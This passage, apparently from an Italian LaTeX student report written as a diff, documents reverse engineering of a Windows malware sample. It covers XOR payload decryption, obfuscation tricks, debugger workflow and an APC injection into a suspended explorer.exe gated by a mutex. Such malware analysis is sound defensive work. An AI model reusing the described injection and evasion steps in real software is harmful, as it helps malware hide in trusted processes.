+            La decifratura in figura \ref{fig:dec_decrypt_inplace_new} (\texttt{encCodePtr2[\textunderscore idx\textunderscore 2] = $\dots$}) è su 
+            singolo byte e basata su XOR,
+            quindi il codice eseguibile è stato crittato con uno stream cipher. La decifratura
+            è "in-place": \texttt{encCodeSize = codeSize}, non c'è necessità da parte della routine di
+            decifratura di fare copie, aggiustare permessi di pagine etc etc\dots Ogni byte cifrato viene
+            sostituito dal corrispondente decifrato nella sua stessa posizione.
+            Alla funzione decrittante vengono passati due puntatori uguali \texttt{encCodePtr1}, 
+            \texttt{encCodePtr2} (ridondante). Il for loop viene eseguito per indice che va da $\{ 0, 
+            ..., \texttt{encCodeSize} \}$
+            \pic{dec_decrypt_inplace_new}{Decryption del codice eseguibile}{15cm}{5.5cm}
+
+            \pic{dec_cleanup_new}{Deallocazione dei buffer}{8cm}{2.5cm}
+
+            \subsubsection{Nuova signature "\texttt{DecryptMalCode}"}
+
+            \pic{dec_signature_new}{Signature corrispondente a \texttt{FUN\textunderscore 004664BD}}
+            {18cm}{1.5cm}
+
+            \subsection{Torno a \texttt{SuspectEntryPoint}}
+
+            Chiamata a indirizzo non calcolabile a compile time (settato a runtime):
+            \pic{see_final_call}{Pulizia stack + chiamata}{16cm}{1.5cm}
+
+            Quindi, in decompilato, il risultato finale:
+            \pic{see_final_decomp}{L'intera funzione \texttt{SuspectEntryPoint}}{17cm}{10cm}
+
+            \subsection*{Ghidra e le cross-references nel mezzo della funzione}
+
+            Una tecnica per disturbare l'analista è quella di spargere qua e la nel codice (che non verrà 
+            mai raggiunto, aka non ci sarà mai alcun problema a runtime) chiamate (\texttt{CALL}s) nel 
+            mezzo di una vera e propria routine, Ghidra ovviamente deduce che c'è qualcosa di sbagliato
+            e ci avvisa:
+            \pic{ghidra_midcall_xrefs}{XREF fastidiosa}{19cm}{3cm}
+
+            \pagebreak
+            
+            Facendo doppio click sulla xref:
+            \pic{ghidra_midcall_call}{\texttt{CALL} iniettata a caso, target nel mezzo di procedura}
+            {14cm}{2cm}
+
+            Per far scomparire la cross reference nel codice target della \texttt{call}, è sufficiente 
+            effettuare \textit{clear code bytes} sulla \texttt{call} stessa:
+
+            \pic{ghidra_cleared}{\textit{clear}ed \textit{code bytes}}{7cm}{4cm}
+            \pic{ghidra_cleared_effect}{Effetto: niente più xrefs in vicinanza della destinazione della call}{12cm}{2.5cm}
+
+            \subsection*{Recupero del codice malevolo individuato da \texttt{malFunPtr}}
+
+            Come osservato precedentemente, la \texttt{VirtualAlloc}, che riserva pagine con permessi di 
+            esecuzione per eseguire il codice malevolo, riceve come parametro di preferenza (indirizzo di 
+            base) di mappatura pagine in memoria \texttt{NULL}, quindi non è noto a compile time: l'unico
+            modo per riuscire a conoscere e dumpare il codice eseguibile "raw" è quello di usare OllyDbg,
+            settare breakpoint alla \texttt{call} non nota a compile time (figura \ref{fig:see_final_call}), eseguire step into ed 
+            effettuare memory dump. \texttt{VirtualAlloc} lavora in ogni caso a granularità di pagina, ma 
+            comunque viene passata la size totale del codice eseguibile, quindi possiamo dumpare la memoria
+            dall'indirizzo di base riservato da \texttt{VirtualAlloc} + size codice eseguibile (nota a
+            compile time): la figura \ref{fig:cemc_offs_data} contiene il valore 
+            \texttt{Initial\textunderscore CEMC\textunderscore Read\textunderscore Nbytes} che viene 
+            passato sia a \texttt{VirtualAlloc} che poi 
+            \texttt{ReadFile}: è la size in bytes del codice eseguibile, quindi:
+
+            \pic{odbg_mal_follow}{Follow nel memory dump}{15cm}{6cm}
+            Viene effettuata una select all che va ben oltre il numero di bytes del codice eseguibile
+            per via della selezione estremamente lenta di OllyDbg, sarà irrilevante nell'analisi
+            dal momento in cui conosciamo la grandezza del codice eseguibile:
+            \pic{odbg_mal_selectall}{Select all}{10cm}{7cm}
+            \pic{odbg_mal_dump}{Save data to file}{9cm}{7cm}
+
+            \subsection*{Apertura in Ghidra del file che contiene codice eseguibile}
+
+            Essendo codice raw, niente testate / metadati, sarà sufficiente specificare a Ghidra,
+            architettura e compilatore:
+
+            \pic{ghidra_raw_open}{Raw binary}{12cm}{6cm}
+
+            \subsection{Analisi statica avanzata del codice malevolo}
+            L'analisi statica è praticamente impossibile anche usando Ghidra: sono presenti tecniche di
+            offuscamento del codice: per esempio ci sono frequenti jump incondizionati che lasciano intatto
+            lo stato della CPU al salto, rendendo la vita difficile all'analista, ovvero la funzione viene
+            "spezzettata" da questi salti da una parte all'altra del codice.
+
+            \pic{ghidra_raw_imposs}{Esempio}{8cm}{12cm}
+
+            Il salto permetterà al jump target di proseguire a partire dallo stato dello stack/registri
+            attuale, senza intaccare i flags. Risulta impossibile o altamente dispendioso analizzare
+            il codice in questo senso.
+
+            Invece, possiamo estrarre informazioni riguardo alle API utilizzate: usando la funzione di Ghidra "Search program text" possiamo matchare una stringa nel listing.
+            
+            Essendo caricato (e poi eseguito) nell'address space del processo stesso di sample.exe, il codice malevolo fa affidamento ai thunk delle funzioni risolte dal loader del SO al
+            caricamento di sample.exe nel processo, e quindi il pattern da cercare è \texttt{"dword ptr [DAT\_"}
+            sugli operandi, dato che in questo codice solo le call ne fanno uso.
+            Dopo search all, appariranno tutti i riscontri positivi sulla ricerca:
+            \pic{ghidra_raw_calls}{E' di interesse l'ultima colonna}{19cm}{10cm}
+
+            Per conoscere queste funzioni, prelevo l'indirizzo virtuale \texttt{XYZXYZXY} dalla label 
+            \texttt{DAT\_XYZXYZXY}, apro l'istanza di
+            Ghidra di sample.exe $\rightarrow$ qui cerco in \texttt{.rdata} - all'indirizzo virtuale 
+            \texttt{XYZXYZXY} ci sarà un thunk di una qualche funzione da risolvere:
+
+            \pic{ghidra_thunk}{Thunk di \texttt{RtlUnwind}}{15cm}{5cm}
+
+            \pagebreak
+            
+            \textbf{API utilizzate dal codice malevolo} \\
+
+            \begin{table}[h!]
+            \begin{center}
+            \begin{tabular}{|c|c|c|}
+                \hline
+                \textbf{UsageAtAddr} & \textbf{ThunkAddress} & \textbf{DLL::Function} \\
+                \hline\hline
+                \texttt{22}   & \texttt{489754} & \texttt{KERNEL32.DLL::VirtualAllocEx} \\
+                \texttt{198}  & \texttt{489780} & \texttt{SHLWAPI.DLL::PathFileExistsA} \\
+                \texttt{69a}  & \texttt{489748} & \texttt{KERNEL32.DLL::GetProcessHeap} \\
+                \texttt{6a1}  & \texttt{474230} & \texttt{KERNEL32.DLL::HeapFree} \\
+                \texttt{a7c}  & \texttt{489748} & \texttt{KERNEL32.DLL::GetProcessHeap} \\
+                \texttt{a83}  & \texttt{474234} & \texttt{KERNEL32.DLL::HeapAlloc} \\
+                \texttt{abc}  & \texttt{489750} & \texttt{KERNEL32.DLL::CreateProcessA} \\
+                \texttt{c21}  & \texttt{48975c} & \texttt{KERNEL32.DLL::QueueUserAPC} \\
+                \texttt{1057} & \texttt{474248} & \texttt{KERNEL32.DLL::SetErrorMode} \\
+                \texttt{1277} & \texttt{474268} & \texttt{KERNEL32.DLL::CreateFileA} \\
+                \texttt{1366} & \texttt{474210} & \texttt{KERNEL32.DLL::ExitProcess} \\
+                \texttt{1461} & \texttt{474214} & \texttt{KERNEL32.DLL::Sleep} \\
+                \texttt{1730} & \texttt{489748} & \texttt{KERNEL32.DLL::GetProcessHeap} \\
+                \texttt{1e11} & \texttt{474350} & \texttt{KERNEL32.DLL::GetModuleFileNameA} \\
+                \texttt{1e6f} & \texttt{474298} & \texttt{KERNEL32.DLL::SetFilePointer} \\
+                \texttt{1f33} & \texttt{474214} & \texttt{KERNEL32.DLL::Sleep} \\
+                \texttt{2110} & \texttt{47430c} & \texttt{KERNEL32.DLL::CloseHandle} \\
+                \texttt{219c} & \texttt{474234} & \texttt{KERNEL32.DLL::HeapAlloc} \\
+                \texttt{2266} & \texttt{474214} & \texttt{KERNEL32.DLL::Sleep} \\
+                \texttt{22df} & \texttt{474268} & \texttt{KERNEL32.DLL::CreateFileA} \\
+                \texttt{2932} & \texttt{48974c} & \texttt{KERNEL32.DLL::OpenMutexA} \\
+                \texttt{3065} & \texttt{489764} & \texttt{KERNEL32.DLL::GetSystemDefaultLangID} \\
+                \texttt{392e} & \texttt{474210} & \texttt{KERNEL32.DLL::ExitProcess} \\
+                \texttt{3f33} & \texttt{489758} & \texttt{KERNEL32.DLL::WriteProcessMemory} \\
+                \texttt{40ad} & \texttt{489748} & \texttt{KERNEL32.DLL::GetProcessHeap} \\
+                \texttt{40b4} & \texttt{474230} & \texttt{KERNEL32.DLL::HeapFree} \\
+                \texttt{43a1} & \texttt{489768} & \texttt{KERNEL32.DLL::GetAtomNameA} \\
+                \texttt{43f6} & \texttt{474220} & \texttt{KERNEL32.DLL::VirtualAlloc} \\
+                \texttt{4aac} & \texttt{47429c} & \texttt{KERNEL32.DLL::WriteFile} \\
+                \texttt{4ce8} & \texttt{489760} & \texttt{KERNEL32.DLL::ResumeThread} \\
+                \texttt{517a} & \texttt{474350} & \texttt{KERNEL32.DLL::GetModuleFileNameA} \\
+                \texttt{55f8} & \texttt{4742a0} & \texttt{KERNEL32.DLL::ReadFile} \\
+                \texttt{5c91} & \texttt{47430c} & \texttt{KERNEL32.DLL::CloseHandle} \\
+                \texttt{5f83} & \texttt{474210} & \texttt{KERNEL32.DLL::ExitProcess} \\
+                \hline
+            \end{tabular}
+            \caption{API utilizzate, 34 calls totali}
+            \label{table:apiusage}
+            \end{center}
+            \end{table}
+
+            La presenza di \texttt{CreateProcessA}, \texttt{WriteProcessMemory} e \texttt{QueueUserAPC}
+            possono indicarci che il malware vuole far eseguire uno shellcode (evasione) a un processo
+            appena creato da lui stesso
+
+            \section{Analisi dinamica avanzata}
+
+            L'analisi del codice malevolo deve per forza essere eseguita sfruttando debuggers, in modo
+            da poter capire in maniera meno dispendiosa rispetto a un disassembler interattivo, qual'è
+            l'obiettivo che persegue questo codice.
+
+            Dato che per "fare danni" il malware deve interagire col SO, e dato che dal disassemblato
+            non si capisce bene quali siano gli argomenti attuali passati alle WinAPI, un primo approccio, 
+            dato che conosciamo l'usage delle API relativamente all'indirizzo base del codice malevolo 
+            caricato, è quello di settare dei breakpoint in corrispondenza delle call. 
+            
+            OllyDbg sarà in grado di mostrare gli argomenti passati prima di procedere con la chiamata.
+
+            \textbf{Il problema} è che ogni volta, settare di nuovo 34 breakpoints, è fastidioso per l'
+            analista, dato che \texttt{VirtualAlloc} cambia base address ogni volta (OllyDbg non riesce 
+            più a tenere traccia dei breakpoint).
+
+            Si osserva, però, che dal momento in cui viene fatta la call all'entry del codice malevolo,
+            una volta effettuato resume, il processo aspetta qualche secondo e poi esce immediatamente.
+
+            E nell'API usage, compaiono delle \texttt{Sleep}, quindi forse conviene provare a settare
+            dei breakpoint inizialmente solo sulle sleep e \texttt{ExitProcess} per capire cosa stia
+            succedendo.
+
+            Va osservato, che prima di analizzare il codice malevolo, lasciamo che sia il malware stesso
+            a decriptarlo per noi. Il debugger ovviamente permette al malware di eseguire
+            la routine di decifratura descritta nell'analisi statica avanzata, prima di poter saltare nel
+            codice malevolo.
+
+            \subsection{Prima ondata di breakpoint}
+            
+            I primi breakpoint settati quindi:
+
+            \pic{brkp_first_wave}{Prima "ondata" di breakpoint}{18cm}{3cm}
+
+            Viene quindi raggiunta la prima sleep da 1s (break @ \texttt{1461}), OllyDbg non è in grado di ricostruire
+            i parametri passati per via dei vari meccanismi di offuscamento, ma sullo stack,
+            l'ultima push deve essere per forza l'argomento della funzione che si sta per
+            chiamare:
+
+            \pic{first_sleep_1s}{Prima sleep, 1s come argomento sullo stack}{8cm}{1cm}
+
+            Dal breakpoint, si prosegue in step over. Oltre al fatto che sono presenti i soliti meccanismi
+            di offuscamento di passaggio di argomenti, flusso di istruzioni,\dots  prima di raggiungere la
+            \texttt{ExitProcess}, viene chiamata \texttt{OpenMutexA}, e poi, più in la ne viene 
+            verificato il valore di ritorno, in base al quale si decide se chiamare \texttt{ExitProcess} o 
+            saltare a un certo indirizzo
+
+            \subsubsection{\texttt{OpenMutexA}}
+
+            Lasciando invariato l'ambiente di esecuzione, si ricarica l'eseguibile in OllyDbg e si
+            setta breakpoint su \texttt{2932} dove c'è la call a \texttt{OpenMutexA}
+
+            Argomenti pushati sullo stack prima della call:
+            \pic{oma_args}{\texttt{OpenMutexA} args}{8cm}{1cm}
+
+            La costante \texttt{Access = 1F0001} corrisponde a 
+            \texttt{MUTEX\_ALL\_ACCESS}, il resto degli argomenti è auto esplicativo.
+
+            Comunque, step over e \texttt{EAX = 21c}, \texttt{OpenMutexA} ha restituito un handle valido,
+            infatti, usando l'utility "handles" di OllyDbg
+
+            \pic{handles_mutant}{Handles aperti per il processo, l'ultimo è quello di interesse}{15cm}{4cm}
+
+            Dopo numerosi step over, si arriva a:
+
+            \pic{cmp}{Comparison}{9cm}{1.5cm}
+
+            che decide se il processo deve terminare o proseguire, e lo fa confrontando...
+
+            \pic{ebpmin4}{Locazione individuata da \texttt{EBP - 4}, contiene handle restituito da 
+            \texttt{OpenMutexA}}{10cm}{2cm}
+
+            con \texttt{ECX} che al momento della cmp è 0.
+
+            \begin{enumerate}
+                \item \texttt{pop ecx} immediatamente successivo non modifica le flags
+                \item \texttt{je short 001F3934} salta la \texttt{ExitProcess}
+            \end{enumerate}
+
+            Quindi, per il momento sappiamo che:
+
+            \begin{lstlisting}[language=C]
+#include <Windows.h>
+/* ... */
+Sleep(1000);
+if(OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "toysegg_main") != 0) {
+    ExitProcess(0);
+} else {
+    /* ... */
+            \end{lstlisting}
+
+            Per capire meglio cosa faccia il processo tra quando c'è la call al codice malevolo (la call non nota a compile time) fino a 
+            \texttt{ExitProcess}, conviene usare tool di monitoraggio come procmon.
+
+            \pic{getlocale}{Lettura informazioni localizzazione di sistema 
+            (\texttt{GetSystemDefaultLangID})}{15cm}{4cm}
+            \pic{readitself}{Lettura di se stesso (\texttt{CreateFileA}, \texttt{ReadFile}, 
+            \texttt{CloseHandle})}{13cm}{1cm}
+            \pic{exitproc}{Terminazione processo (\texttt{ExitProcess})}{15cm}{6cm}
+
+            Possiamo quindi dedurre che tra l'inizio del codice malevolo e la terminazione del processo
+            non avvenga nulla di sospetto (almeno con un debugger).
+
+            Si può supporre però, che ovviamente nel malware siano presenti tecniche anti-debugger.
+
+            \subsection{Tecniche anti-debugging}
+
+            Dividiamo le tecniche anti-debugging in due macro categorie:
+            
+            \begin{itemize}
+                \item Non sono state rilevate API classiche \texttt{IsDebuggerPresent},
+                    \texttt{CheckRemoteDebuggerPresent}
+                \item Non sono state rilevate API per fare walking nel filesystem (e quindi cercare
+                    debuggers). L'unica API relativa al fs rilevata, \texttt{PathFileExistsA}, non viene
+                    usata.
+                \item Non sono state rilevate API per verificare tra i programmi installati, per esempio
+                    \href{https://learn.microsoft.com/it-it/windows/win32/api/msi/nf-msi-
+                    msienumproductsexa?redirectedfrom=MSDN}{\texttt{MsiEnumProductsExA}}
+                \item Non è stata rilevata \texttt{FindWindowA} per cercare il titolo di finestre di
+                    debuggers.
+            \end{itemize}
+
+            Le tecniche non basate su API da verificare sono, in ordine di facilità di implementazione
+
+            \begin{enumerate}
+                \item Check flag \texttt{BeginDebugged} della \texttt{PEB}
+                \item Check flag \texttt{Flags} e \texttt{ForceFlags} della \texttt{ProcessHeap}
+                
+                    \textbf{Nota}: molto improbabile il suo utilizzo, data l'alta dipendenza degli offset
+                    di \texttt{Flags} e \texttt{ForceFlags} relativamente a \texttt{ProcessHeap} dalla
+                    versione di Windows
+                \item Check trap flag
+                
+                    \textbf{Nota}: anch'essa molto improbabile, se fosse usata sarebbe inefficace
+                    con moltissimi debugger. La trap flag, che sta a indicare passaggi singoli delle
+                    istruzioni, una volta che il debugger gestisce l'eccezione generata, ne fa il reset a
+                    0, quindi non rilevabile
+                \item Scansione della memoria, alla ricerca di breakpoint
+                \item Misura tempo esecuzione istruzioni
+            \end{enumerate}
+
+            Da Ghidra, si può cercare nel listing, tra gli operandi delle istruzioni, il registro
+            \texttt{fs}:
+
+            \pic{antidbg_fsfound}{Trovato usage di \texttt{fs}}{17cm}{9cm}
+
+            Allora, a causa della presenza delle solite tecniche di offuscamento del codice assembly,
+            a partire da quando fa la load del valore di \texttt{BeingDebugged}, seguiamo i jump
+            incondizionati fino a quando ci sarà un'istruzione \texttt{test} o \texttt{cmp}...
+
+            \subsubsection{Ricerca check \texttt{PEB::BeginDebugged}}
+            In \texttt{EBX} viene caricata la \texttt{PEB}, ma è poco indicativo perchè tenere
+            traccia dei registri su tutte le jump è praticamente impossibile a causa del codice di 
+            offuscamento, comunque sappiamo che il malware ha intenzione di verificare a breve la flag
+            
+            Seguo le jump\dots
+            \pic{antidbg_startingpoint}{Punto di inizio della ricerca di \texttt{cmp} o \texttt{test}}
+            {7cm}{3cm}
+
+            Nel mezzo delle jumps è presente anche codice del genere, ma non ci interessa
+            (dato che avvengono dei "rimescolamenti")
+            \pic{antidbg_aftersomejmps}{Codice di poco conto}{8cm}{1cm}
+
+            \pagebreak
+            
+            E dopo molti click sulle label delle jump, si arriva a:
+            \pic{antidbg_test}{Istruzione \texttt{test} trovata @ \texttt{39c0}}{7cm}{3cm}
+
+            Molto probabilmente questo codice è quello che determina se il processo è debuggato oppure no
+            e permette al malware di decidere se terminare o meno. Verifico su OllyDbg.
+
+            \subsection{Verifica presenza meccanismo anti-debugging su OllyDbg}
+
+            Setto il breakpoint su \texttt{XXXX39C0}, ma comunque non viene mai raggiunto.
+
+            \textbf{Cambio direzione}: dato che il valore di ritorno di \texttt{OpenMutexA} è la causa per
+            cui il programma si arresta, provo direttamente a cambiare il valore di \texttt{ECX} per far
+            proseguire il programma: lo setto quindi uguale al valore contenuto all'indirizzo \texttt{EBP - 4} cosi il \texttt{je} viene
+            eseguito (le flag fanno si che il salto venga eseguito), da procmon vedo che cosa succede.
+
+            \pic{openmutexa_check}{Check sul valore restituito di \texttt{OpenMutexA}} {10cm}{1.5cm}
+            \pic{openmutexa_handle}{Valore dell'handle in \texttt{EBP - 4} (\texttt{218})} {4cm}{1.5cm}
+            \pic{openmutexa_ecx}{Cambio del registro \texttt{ECX} quando \texttt{EIP} punta a \texttt{CMP 
+            DWORD PTR \dots}}{7cm}{1.75cm}
+
+            su procmon\dots
+            \pic{openmutexa_postcheck}{Creato nuovo processo con immagine explorer.exe\dots}{18cm}{2.5cm}
+
+            Il processo ha creato \textit{explorer.exe} da SysWOW64 che è un (sotto) sistema per Windows
+            a 64-bit per eseguire programmi a 32-bit.
+
+            \subsubsection{Cos'è in realtà la \texttt{test}}
+            Tralasciando per ora questo fatto, torniamo a capire che cosa sia la \texttt{test} in figura
+            \ref{fig:antidbg_test}.
+
+            Per farlo basta settare il breakpoint a \texttt{39c0} e cambiare valore di \texttt{ECX} come appena fatto per far passare il
+            check del valore di ritorno di \texttt{OpenMutexA} e vedere il contesto della CPU appena viene
+            raggiunto il breakpoint:
+
+            \pic{test_brkp}{}{8cm}{1cm}
+            \pic{test_brkp_ecx}{}{6cm}{1cm}
+            \pic{test_brkp_ecx_1}{}{4cm}{1cm}
+            \pic{test_brkp_ecx_2}{}{3cm}{1cm}
+
+            In pratica è usata per verificare null terminator nelle strighe.
+
+            \subsubsection{A che serve in realtà \texttt{OpenMutexA}} \label{sect:oma}
+
+            Leggendo la MSDN, risulta evidente che \texttt{OpenMutexA} non crea il mutex se non esiste,
+            per quello serve \texttt{CreateMutexA} che però dal codice malevolo non viene utilizzato.
+            
+            \texttt{OpenMutexA} ritorna l'handle valido se esiste, altrimenti ritorna \texttt{NULL}.
+            
+            La situazione non tornava perchè nonostante non sia presente la chiamata a 
+            \texttt{CreateMutexA}, rieseguendo il malware, \texttt{OpenMutexA} restituisce sempre handle
+            validi. 
+            
+            Provando a riavviare la VM, effettivamente il mutex non esiste più (\texttt{OpenMutexA} ritorna \texttt{NULL}) e quindi anche sotto
+            un debugger, il malware prosegue, perchè il mutex deve essere creato. Questo significa che 
+            il mutex viene creato da un altra parte del malware. 
+            
+            In particolare, ricordiamo che sono presenti API come \texttt{WriteProcessMemory}, 
+            \texttt{CreateProcessA} (riscontrato su procmon per la creazione di processo basato su 
+            immagine di explorer.exe), \texttt{QueueUserAPC} e \texttt{ResumeThread}, che sono tutte API 
+            necessarie per raggiungere lo scopo dell'evasione. 
+            
+            Quindi, la asynchronous procedure call iniettata in explorer.exe potrebbe essere il deployment 
+            vero e proprio del malware, che appena è in esecuzione apre questo mutex.
+            
+            In questo caso, quindi, \texttt{OpenMutexA} ha il solo scopo di controllare che non vi siano 
+            più istanze in esecuzione del malware sul PC e \textbf{non è un meccanismo anti-debugging}
+            perchè se non è presente il mutex ed eseguiamo sample.exe con OllyDbg allora esso procederà
+            normalmente (niente patches).
+
+            Non a caso, se viene lasciato eseguire per intero il malware (sample.exe) allora al prossimo
+            lancio, che sia da debugger o senza debugger, il mutex è presente e quindi termina 
+            immediatamente, oppure se si imposta un breakpoint sull'unico punto del codice che chiama
+            \texttt{ResumeThread} e quindi si termina il programma dal debugger (dopo il raggiungimento di quest'ultimo breakpoint, con il programma in pausa), allora al prossimo lancio
+            di sample.exe il mutex non esiste (e quindi prosegue con l'injection dell'APC, \dots)
+
+            \subsection{Capire il funzionamento del codice malevolo con API Monitor}\label{sect:malcodeapimon}
+
+            Invece che settare numerosi breakpoint sull'indirizzo di utilizzo delle API (si veda la 
+            tabella sopra) del codice, si può usare API monitor per osservare le API invocate da 
+            sample.exe.
+
+            Nel mezzo tra le \texttt{HeapAlloc}s e \texttt{HeapFree}s non sembra avvenga nulla di sostanziale,
+            (anche provando a eseguire step by step con OllyDbg)
+            o almeno, non sembra esserci alcuna interazione con Windows (e quindi causare danni o compiere azioni
+            "sostanziali")
+            \pic{malcode1_firstcalls}{Allocazione sull'heap annullata immediatamente}{10cm}{3.5cm}
+            Buffer di destinazione necessario per \texttt{GetAtomNameA}, invece è stato passato \texttt{NULL}.
+            Risulta sempre in errore. Provando a capire l'utilizzo che si facesse, sopratutto di \texttt{GetSystemDefaultLangID}, usando OllyDbg, non risulta molto chiaro. Il valore restituito
+            dall'API non viene usato, o comunque non viene usato nell'immediato, è altamente dispendioso determinare
+            quale sia il caso tra i due, a causa della presenza di tecniche di offuscamento.
+            \pic{malcode1_secondcalls}{Usage effettivo sconosciuto}{12cm}{1.5cm}
+            
+            Apertura e lettura da sample.exe del codice della APC da iniettare in explorer.exe. Il buffer di 
+            destinazione della
+            lettura è allocato con \texttt{VirtualAlloc}. Permessi \texttt{PAGE\_EXECUTE\_READWRITE} 
+            sulla/e pagina superflui (buffer nel processo di sample.exe, il codice verrà eseguito in un altro processo).
+            \pic{malcode1_thirdcalls}{Allocazione buffer e lettura da sample.exe}{10cm}{3cm}
+
+            Anche qui, stessa modalità, non avviene alcuna interazione con Windows tra alloc e free.
+            \pic{malcode1_fourthcalls}{Un'altra allocazione sull'heap annullata immediatamente}{10cm}{3.5cm}
+
+            \pagebreak
+
+            \subsubsection*{\underline{Caso \texttt{OpenMutexA} restituisce \texttt{NULL}}}
+            \pic{malcode1_fifthcalls}{\texttt{OpenMutexA}: nessun named mutex creato con questo nome}{12cm}{1.5cm}
+            Dall'immagine non è molto evidente, ma tra le flag di \texttt{CreateProcessA} c'è \texttt{CREATE\_SUSPENDED}. 
+            Il main thread di explorer.exe non viene avviato immediatamente.
+            A \texttt{VirtualAllocEx} viene passato l'handle del processo appena creato, oltre alla modalità
+            di creazione della/e pagine nell'address space del processo remoto, i permessi sono settati su 
+            \texttt{PAGE\_EXECUTE\_READWRITE}.
+            \texttt{WriteProcessMemory} riceve come argomenti attuali anche lui l'handle del processo remoto,
+            l'indirizzo del buffer di destinazione nel processo remoto (appena alloc. da \texttt{VirtualAllocEx})
+            e cerchiato, il buffer sorgente (del processo attuale) nel quale c'è codice eseguibile letto prima 
+            (si veda la figura \ref{fig:malcode1_thirdcalls}) \texttt{0xb10000 + 0x31}.
+            A \texttt{QueueUserAPC} viene passato l'handle al thread principale del processo e \textbf{non} l'handle
+            del processo, insieme all'indirizzo alla APC nel processo remoto. Anche \texttt{ResumeThread} riceve
+            l'handle al thread principale del processo.
+            \pic{malcode1_sixthcalls}{APC injection e resume thread}{14cm}{3cm}
+            Il processo padre si aspetta che il figlio, prima o poi crei una named pipe. Una volta aperta dal padre con successo (dopo che il figlio l'ha creata),
+            scrive in essa il suo stesso module file name (\texttt{"C:\textbackslash Users\textbackslash \dots \textbackslash sample.exe"}).
+            \pic{malcode1_seventhcalls}{Apertura della pipe}{11cm}{3cm}
+
+            Terminazione del processo:
+            \pic{malcode1_eightthcalls}{Chiusura handle della pipe e terminazione processo padre (sample.exe)}{6cm}{1.5cm}
+
+            \pagebreak
+            
+            \textbf{Che cosa succede se la named pipe non viene creata?}
+            Il malware (processo padre, sample.exe) prova ad aprire la pipe con la \texttt{CreateFileA}. La pipe viene aperta da un altro 
+            processo. Su API monitor, viene evidenziato explorer.exe come processo figlio di
+            sample.exe, quindi, dato che per creare la pipe è necessaria la API \texttt{CreateNamedPipeA}
+            e non è presente in sample.exe è abbastanza intuitivo pensare che venga creata da explorer.exe (processo figlio) e poi sample.exe ci si connette.
+            Osserviamo che la prima call a \texttt{CreateFileA}, dalla figura \ref{fig:malcode1_seventhcalls}
+            restituisce \texttt{INVALID\_HANDLE\_VALUE}, quindi esegue una sleep di 1 sec e poi la successiva call
+            ha successo. Che succede se si termina Il processo explorer.exe (il prima possibile, sperando che
+            non venga chiamata \texttt{CreateNamedPipeA} per condurre l' "esperimento")?
+            \pic{malcode3_killchild}{Loop infinito}{13cm}{4cm}
+
+            \begin{lstlisting}[language=C]
+#include <Windows.h>
+/* ... */
+Sleep(10 * 1000);
+HANDLE hPipe = INVALID_HANDLE_VALUE;
+while((hPipe = CreateFileA("\\.\pipe\pipeege", /* ... */)) == INVALID_HANDLE_VALUE) {
+    Sleep(1 * 1000);
+}
+/* ... */
+            \end{lstlisting}
+
+            \subsubsection*{\underline{Caso \texttt{OpenMutexA} restituisce valore diverso da \texttt{NULL}}}
+            \pic{malcode2_fifthcalls}{Esiste già un mutex col nome \texttt{"toysegg\_main"}\dots}{11cm}{1.5cm}
+            \pic{malcode2_sixthcalls}{\dots quindi non effettuo APC injection e termino immediatamente (sample.exe)}{3cm}{0.75cm}
+
+            \subsubsection*{Come è stato individuato il punto di partenza delle API calls di interesse}
+
+            Le API intercettate dalla figura \ref{fig:malcode1_firstcalls} alla \ref{fig:malcode2_sixthcalls},
+            che sono quelle che ci interessano (perchè sono quelle del "codice malevolo" caricato, decriptato e 
+            lanciato dalla posizione non nota a compile time) perchè vengono immediatamente dopo:
+
+            \begin{enumerate}
+                \item API di iniziallizazione (CRT, TLS, ...) dalla num. 1 alla 1885 in figura \ref{fig:initcalls}
+                    \pic{initcalls}{init calls}{10cm}{3.25cm}
+                \item Le chiamate già analizzate approfonditamente con Ghidra (dentro \texttt{SuspectEntryPoint}, \dots)per il caricamento del codice
+                    malevolo in memoria dall'eseguibile sample.exe
+                    \pic{premalcode}{caricamento codice malevolo stesso}{16cm}{3.5cm}
+            \end{enumerate}
+
+            \subsubsection*{Terminare explorer.exe child di sample.exe}
+
+            \underline{Terminare} explorer.exe, child di sample.exe è sufficiente a eliminare l'oggetto mutex da parte del
+            kernel di Windows (anche sample.exe deve essere terminato), in quanto non esistono più reference verso di esso (sample.exe termina nell'arco 
+            di 10-15 sec - i suoi handle per il named mutex vengono chiusi in uscita automaticamente), e quindi 
+            per riottenere il \textbf{caso \texttt{OpenMutexA} restituisce \texttt{NULL}}, invece che \underline{riavviare} 
+            tutta la VM come scritto in sezione \ref{sect:oma}.
+
+            \subsubsection*{Cercare explorer.exe nel task manager}
+
+            Nel task manager, l'immagine di explorer.exe usata dal malware è quella presa da (visibile in API
+            monitor, child process image file):
+            
+            \begin{center}
+            \texttt{C:\textbackslash Windows\textbackslash SysWOW64\textbackslash explorer.exe}
+            \end{center}
+            
+            Dove \texttt{SysWOW64} è il sottosistema di Windows per applicazioni a 32-bit in esecuzione su Windows
+            a 64-bit. Si osserva come a \texttt{CreateProcessA}, il processo definito da sample.exe, passa
+            semplicemente la stringa "Explorer.exe" e non il path assoluto completo. Dato che sample.exe è a 32 bit,
+            e Windows a 64 bit, quest'ultimo va a cercare "Explorer.exe" automaticamente in \texttt{C:\textbackslash Windows\textbackslash SysWOW64}
+            
+            Quindi nel task manager cerchiamo:
+
+            \pic{explorer_fake}{Esplora risorse fake}{12cm}{5cm}
+
+            \subsubsection{Quindi, alla fine, cosa fa questo "codice malevolo"?}
+            Per evadere, il malware si è nascosto in explorer.exe che è un processo ben noto di Windows.
+            Lo ha fatto sfruttando la tecnica dell'APC injection: ovvero, in Windows user mode c'è per ogni
+            thread, una queue di APC che esso deve eseguire quando è in pausa 
+            (\texttt{WaitForSingleObjectEx}, \texttt{SleepEx}). Accodando il function pointer alla funzione 
+            appena scritta nel process address space vittima, quando arriva il suo turno (queue FIFO), anch'essa viene
+            eseguita (e quindi eseguito il malware nascosto dall'applicazione legittima).
+            Creando il processo con flag \texttt{CREATE\_SUSPENDED}, il SO alloca pagine, popola IAT, \dots ma non fa
+            partire il thread principale e quindi siamo sicuri, dopo aver effettuato la APC injection e fatto
+            ripartire il thread con \texttt{ResumeThread} che un processo come explorer.exe, partendo dall'entry 
+            point effettivo, prima o poi chiami \texttt{WaitForSingleObjectEx} ad esempio.
+
+            Quindi, sample.exe, a grandi linee:
+            \begin{enumerate}
+                \item Carica (legge dal suo stesso file eseguibile), decripta e fa partire il "codice malevolo"
+                \item Crea il processo explorer.exe (suspended main thread)
+                \item Carica (legge dal suo stesso file eseguibile) il malware vero e proprio da iniettare
+                \item Effettua APC injection (main thread) del malware caricato nel processo explorer.exe
